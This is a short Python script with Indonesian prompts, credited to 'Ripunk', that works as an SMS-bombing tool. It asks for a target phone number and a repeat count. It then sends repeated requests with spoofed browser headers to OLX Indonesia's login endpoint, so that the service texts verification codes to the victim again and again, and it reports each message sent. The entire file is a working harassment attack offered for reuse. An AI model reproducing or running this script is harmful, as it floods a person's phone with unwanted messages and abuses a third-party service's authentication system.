#Author Ripunk
#Silahkan yg mau recode asal mencantumkan Author

import requests,json,os,time,sys



def slow(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.1 / 80)


os.system("clear")

logo = "+----------------------------------+ \nSource Code By Ripunk \nYouTube Ripunk \nGitHub https://github.com/R1punk \n+----------------------------------+"
slow(logo)
print("")
print("Ex 812xxxxxx")
no = input("Masukan Nomer: ")
jumlah = int(input("Jumlah Spam: "))
ua = {
'accept': '*/*',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-US,en;q=0.9',
'content-length': '62',
'content-type': 'application/json',
'origin': 'https://www.olx.co.id',
'referer': 'https://www.olx.co.id/',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'}
data = json.dumps({"grantType":"phone","phone":"+62"+no,"language":"id"})
for i in range(jumlah):
    r = requests.post("https://www.olx.co.id/api/auth/authenticate",data=data,headers=ua).text
    if "PENDING" in r:
        print("Sms terkirim")
    else:
        print("Gagal")
